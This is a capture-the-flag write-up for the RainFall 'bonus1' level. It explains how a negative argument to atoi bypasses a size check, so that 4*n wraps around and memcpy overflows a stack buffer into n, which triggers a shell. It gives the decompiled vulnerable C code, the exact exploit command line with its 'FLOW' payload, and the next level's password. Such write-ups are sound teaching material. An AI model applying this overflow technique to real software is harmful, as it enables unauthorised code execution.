## bonus1

This challenge hinges on signed integer conversion: `atoi` allows negative values, so the `n > 9` check can be bypassed while still giving `memcpy` a size big enough to overflow the buffer into `n` itself.

We'd like to set `n = 44 / 4 = 11`, but the check forbids it. The trick then is to set n = `11 - 2**30`. When it is multiplied by 4, `2**30` becomes `2**32` which overflows, and we are left with 44 bytes copied.

```c
int main(int argc, const char** argv, const char** envp) {
    char dest[40];
    int n = atoi(argv[1]);
    if (n > 9) return EXIT_FAILURE;
    memcpy(dest, argv[2], 4 * n);
    printf("%d\n", n);
    if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);
    return EXIT_SUCCESS;
}
```

```console
bonus1@RainFall:~$ bc <<< 11-2^30 
-1073741813
bonus1@RainFall:~$ echo -e '\x57\x4f\x4c\x46' | rev
FLOW
bonus1@RainFall:~$ ./bonus1 -1073741813 FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
